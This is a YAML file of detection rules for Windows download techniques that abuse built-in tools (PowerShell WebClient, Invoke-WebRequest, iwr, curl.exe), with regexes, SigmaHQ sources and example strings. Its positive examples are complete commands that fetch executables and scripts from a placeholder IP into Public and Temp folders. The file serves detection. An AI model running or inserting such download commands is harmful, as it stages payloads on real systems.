# Mention patterns for signed-binary and script-host download and execution forms (living off the land): download
# to disk through PowerShell, BITS-adjacent and vendor binaries, scriptlet and HTA execution, and the rundll32 export
# family. Sources are SigmaHQ rules and LOLBAS entries at pinned commits, cited per entry. Download forms are strong
# only with a URL argument where the binary has no ordinary download use; forms that installers and administrators
# use (INF installs, url.dll, Control_RunDLL, curl.exe) are medium or weak.

- id: mention.lolbin_webclient_downloadfile
  title: PowerShell WebClient '.DownloadFile(' text with a URL
  match:
    anchored: '\.DownloadFile\( {0,2}["'']?(?:https?|ftp)://'
  case_sensitive: false
  strength: medium
  attack: [T1105, T1059.001]
  telemetry: [any]
  source:
    name: 'SigmaHQ: PowerShell Download Via Net.WebClient - PowerShell Classic (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_classic/posh_pc_download_via_webclient.yml
    license: DRL-1.1
    upstream_id: 3236fcd0-b7e3-4433-b4f8-86ad61a9af2d
  rationale: >-
    The rule's Net.WebClient '.DownloadFile(' form with the URL argument: a payload written to disk for a later
    step. The rule itself notes patch-management tools and updaters do the same, so it is medium; the destination
    path and URL host decide.
  examples:
    positive:
      - 'powershell -c "(New-Object System.Net.WebClient).DownloadFile(''http://203.0.113.7/u.exe'', ''C:\Users\Public\u.exe'')"'
    negative:
      - 'powershell -c "$wc = New-Object System.Net.WebClient; $wc.Headers.Add(''User-Agent'',''inventory'')"'
      - 'Nov 21 10:00:00 sccm01 CcmExec: Download of content PS100012 completed to C:\Windows\ccmcache\a'

- id: mention.lolbin_invoke_webrequest_outfile_user_path
  title: Invoke-WebRequest -OutFile into a user, temp or Windows path
  match:
    anchored: 'Invoke-WebRequest [^\n]{0,200}-O(?:utFile|utF|ut|u)? {1,3}["'']?[^\n"'' ]{0,40}(?:\\AppData\\|\\Desktop\\|\\Temp\\|\\Users\\Public\\|%AppData%|%Public%|%Temp%|%tmp%|\$env:TEMP|\$env:APPDATA|\$env:PUBLIC|:\\Windows\\)'
  case_sensitive: false
  strength: medium
  attack: [T1105, T1059.001]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Invoke-WebRequest Execution (Nasreddine Bencherchali, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml
    license: DRL-1.1
    upstream_id: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc
  rationale: >-
    The rule's command, output flag and suspicious-location selections in their usual order: a download saved under
    AppData, Desktop, Temp, Public or the Windows directory. Installer scripts also stage into Temp, so it is medium
    (high upstream); the URL host decides.
  examples:
    positive:
      - 'powershell -c "Invoke-WebRequest -Uri http://203.0.113.7/a.exe -OutFile $env:TEMP\a.exe"'
    negative:
      - 'powershell -c "Invoke-WebRequest https://intranet.example.org/report.csv -OutFile D:\Reports\r.csv"'
      - 'powershell -c "Invoke-WebRequest -Uri https://api.example.org/health -UseBasicParsing"'

- id: mention.lolbin_iwr_outfile_user_path
  title: iwr -OutFile into a user, temp or Windows path
  match:
    anchored: 'iwr [^\n]{0,200}-O(?:utFile|utF|ut|u)? {1,3}["'']?[^\n"'' ]{0,40}(?:\\AppData\\|\\Desktop\\|\\Temp\\|\\Users\\Public\\|%AppData%|%Public%|%Temp%|%tmp%|\$env:TEMP|\$env:APPDATA|\$env:PUBLIC|:\\Windows\\)'
  case_sensitive: false
  strength: medium
  attack: [T1105, T1059.001]
  telemetry: [any]
  source:
    name: 'SigmaHQ: Suspicious Invoke-WebRequest Execution (Nasreddine Bencherchali, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml
    license: DRL-1.1
    upstream_id: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc
  rationale: >-
    The same selections with the iwr alias. Medium for the same reason as the long form.
  examples:
    positive:
      - 'powershell.exe iwr -Uri http://203.0.113.7/b.ps1 -OutFile %TEMP%\b.ps1 -UseBasicParsing'
    negative:
      - 'powershell -c "iwr https://intranet.example.org/a.zip -OutFile D:\Staging\a.zip"'
      - 'powershell -c "iwr https://api.example.org/health | Select-Object StatusCode"'

- id: mention.lolbin_curl_exe_download
  title: Windows curl.exe text with an output-file flag
  match:
    anchored: 'curl\.exe["'']? [^\n]{0,200}(?: -O| -o |--output|--remote-name)'
  case_sensitive: false
  strength: weak
  attack: [T1105]
  telemetry: [any]
  source:
    name: 'SigmaHQ: File Download Via Curl.EXE (Florian Roth, Nextron Systems)'
    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-threat-hunting/windows/process_creation/proc_creation_win_curl_download.yml
    license: DRL-1.1
    upstream_id: 9a517fca-4ba3-4629-9278-a68694697b81
  rationale: >-
    A threat-hunting rule: the built-in curl.exe saving a remote file. Admin and developer scripts (and Git for
    Windows) do it routinely, so it is a weak candidate; the URL host and output path decide. Matched without case
    because Windows file names are case-insensitive (Curl.exe).
  examples:
    positive:
      - 'C:\Windows\System32\curl.exe -k http://203.0.113.7/a.dll -o C:\Users\Public\a.dll'
    negative:
      - 'C:\Windows\System32\curl.exe -s https://api.example.org/health'
      - 'C:\Windows\System32\curl.exe --version'

